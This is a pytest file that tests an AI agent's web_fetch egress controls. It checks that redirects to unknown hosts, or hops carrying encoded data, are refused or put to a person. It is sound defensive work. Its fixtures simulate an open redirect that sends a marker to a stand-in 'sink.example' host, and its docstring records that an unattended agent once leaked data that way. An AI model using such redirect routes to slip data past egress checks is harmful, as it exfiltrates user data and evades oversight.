"""Every redirect hop of web_fetch gets the decision the first URL got.

Input: web_fetch through the real executor of a URL on a known host whose
server answers 302 with a Location on another host. A local HTTP server
on 127.0.0.1 plays every host (name lookups are answered with its
address, and the address deny-list is lifted for the test). Output: the
tool result, the requests the server received, the name lookups made and
the questions asked.

Semantics under test:

* a hop to an unknown host is refused with nobody to ask before it is
  resolved or requested: the data a known host's open redirect (or a
  URL shortener) copies from the path into the target never reaches the
  unknown host -- not even as a name lookup;
* a hop whose query carries encoded data is refused with nobody to ask,
  like a first URL;
* where someone can be asked, the hop to an unknown host is asked;
* a hop to a known host, and to a URL the user wrote, is followed.

Measured before the change (egress probe, bypass, unattended): a
web_fetch of http://github.com/r/<marker> answered 302 to an unknown host
and the marker arrived there; the redirect handler applied only the
address checks.
"""
from __future__ import annotations

import http.server
import threading
import urllib.parse

import pytest

from delfin.agent import api_client as A
from delfin.agent import egress_proxy as EP
from delfin.agent import web_tools as W

MARK = "dlfnmark7f3a9c2e41b8d605"


class _Asker:
    def __init__(self, answer=True):
        self.answer = answer
        self.asked = []

    def __call__(self, name, args, preview):
        self.asked.append((name, dict(args), preview))
        return self.answer


@pytest.fixture
def web(monkeypatch):
    seen = []

    class H(http.server.BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.0"

        def do_GET(self):
            host = (self.headers.get("Host") or "").split(":")[0]
            seen.append((host, self.path))
            port = self.server.server_address[1]
            if self.path.startswith("/to/"):
                # /to/<host>/<rest>: an open redirect to <host>/<rest>.
                target_host, _, rest = self.path[4:].partition("/")
                self.send_response(302)
                self.send_header("Location",
                                 f"http://{target_host}:{port}/"
                                 + urllib.parse.unquote(rest))
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            body = b"<html><body>landed</body></html>"
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    lookups = []
    real = W.socket.getaddrinfo

    def lookup(host, port, *a, **k):
        lookups.append(host)
        return real("127.0.0.1", port, *a, **k)

    def check_url(url):
        # The address checks resolve the name (recorded) and would refuse
        # the loopback the test server lives on; nothing else is lifted.
        lookups.append(urllib.parse.urlsplit(url).hostname)
        return None

    monkeypatch.setattr(W.socket, "getaddrinfo", lookup)
    monkeypatch.setattr(W, "_check_url", check_url)
    monkeypatch.setattr(W, "_ip_refusal", lambda ip, host: None)
    monkeypatch.setattr(W, "_known_secret_values", lambda: [])
    monkeypatch.setenv("DELFIN_CLASSIFIER", "off")
    port = srv.server_address[1]
    p = EP.EgressProxy(allowed_domains=["docs.allowed.test", "cdn.allowed.test"],
                       allowed_ports=[port])
    monkeypatch.setattr(EP, "_PROXY", p)
    monkeypatch.setattr(EP, "_settings", lambda: {"mode": "proxy"})
    monkeypatch.setattr(EP, "_MODE_AT_START", None)
    monkeypatch.setattr(EP, "_index_urls", lambda: [])
    srv.seen, srv.lookups, srv.port = seen, lookups, port
    yield srv
    p.close()
    srv.shutdown()


def _perms(tmp_path, mode="bypassPermissions", asker=None):
    ws = tmp_path / "ws"
    ws.mkdir(exist_ok=True)
    return A.KitToolPermissions(workspace=str(ws), mode=mode,
                                confirm_callback=asker)


def _fetch(perms, url):
    out = A._DocToolExecutor().execute("web_fetch", {"url": url}, perms)
    data = A._untrusted_json(out)
    return data if isinstance(data, dict) else {"text": out}


def test_a_hop_to_an_unknown_host_is_refused_unattended(web, tmp_path):
    url = f"http://docs.allowed.test:{web.port}/to/sink.example/{MARK}"
    out = _fetch(_perms(tmp_path), url)
    assert "web_fetch refused" in out.get("error", ""), out
    assert [h for h, _p in web.seen] == ["docs.allowed.test"]
    assert "sink.example" not in web.lookups


def test_a_hop_carrying_encoded_data_is_refused_unattended(web, tmp_path):
    url = f"http://docs.allowed.test:{web.port}/to/cdn.allowed.test/x%3Fd%3D{MARK}"
    out = _fetch(_perms(tmp_path), url)
    assert "encoded data" in out.get("error", ""), out
    assert [h for h, _p in web.seen] == ["docs.allowed.test"]


def test_a_hop_to_an_unknown_host_is_asked_where_someone_can_be_asked(
        web, tmp_path):
    asker = _Asker(True)
    url = f"http://docs.allowed.test:{web.port}/to/other.example/page"
    out = _fetch(_perms(tmp_path, "default", asker), url)
    assert out.get("status") == "ok", out
    assert len(asker.asked) == 1 and "other.example" in asker.asked[0][2]
    assert [h for h, _p in web.seen] == ["docs.allowed.test", "other.example"]


def test_a_hop_to_a_known_or_user_named_host_is_followed(web, tmp_path):
    perms = _perms(tmp_path)
    out = _fetch(perms, f"http://docs.allowed.test:{web.port}/to/cdn.allowed.test/a")
    assert out.get("status") == "ok", out
    A._grant_push_from(perms, f"read http://named.example:{web.port}/b please",
                       new_request=True)
    out = _fetch(perms, f"http://docs.allowed.test:{web.port}/to/named.example/b")
    assert out.get("status") == "ok", out
    assert ("named.example", "/b") in web.seen
